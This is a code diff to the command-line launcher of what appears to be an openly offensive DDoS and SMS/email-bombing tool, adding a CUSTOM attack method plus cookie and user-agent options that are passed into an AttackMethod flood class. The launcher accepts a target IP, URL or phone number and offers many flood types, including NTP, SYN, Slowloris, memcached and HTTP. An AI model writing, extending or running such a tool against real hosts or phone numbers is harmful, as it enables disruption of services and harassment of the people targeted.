@@ -1,4 +1,5 @@
 # Created by LimerBoy
+# Modified by Vinny
 # Import modules
 import os
 import sys
@@ -25,17 +26,33 @@ parser.add_argument(
     metavar="<IP:PORT, URL, PHONE>",
     help="Target ip:port, url or phone",
 )
+
+# Method argument
 parser.add_argument(
     "--method",
     type=str,
-    metavar="<SMS/EMAIL/NTP/UDP/SYN/ICMP/POD/SLOWLORIS/MEMCACHED/HTTP>",
+    metavar="<SMS/EMAIL/NTP/UDP/SYN/ICMP/POD/SLOWLORIS/MEMCACHED/HTTP/CUSTOM>",
     help="Attack method",
 )
+
+# Time argument
 parser.add_argument(
     "--time", type=int, default=10, metavar="<time>", help="time in secounds"
 )
+
+# Threads argument
 parser.add_argument(
     "--threads", type=int, default=3, metavar="<threads>", help="threads count (1-200)"
+)
+
+#  Cookie argument (optional)
+parser.add_argument(
+    "--cookies", type=str, metavar="<cookies>", help="cookies"
+)
+
+#  User-agent argument (optional)
+parser.add_argument(
+    "--user-agent", type=str, metavar="<user-agent>", help="user-agent"
 )
 
 # Get args
@@ -44,6 +61,8 @@ threads = args.threads
 time = args.time
 method = str(args.method).upper()
 target = args.target
+cookies = args.cookies
+user_agent = args.user_agent
 
 
 if __name__ == "__main__":
@@ -54,6 +73,6 @@ if __name__ == "__main__":
 
     # Run ddos attack
     with AttackMethod(
-        duration=time, name=method, threads=threads, target=target
+        duration=time, name=method, threads=threads, target=target, cookies=cookies, user_agent=user_agent
     ) as Flood:
         Flood.Start()
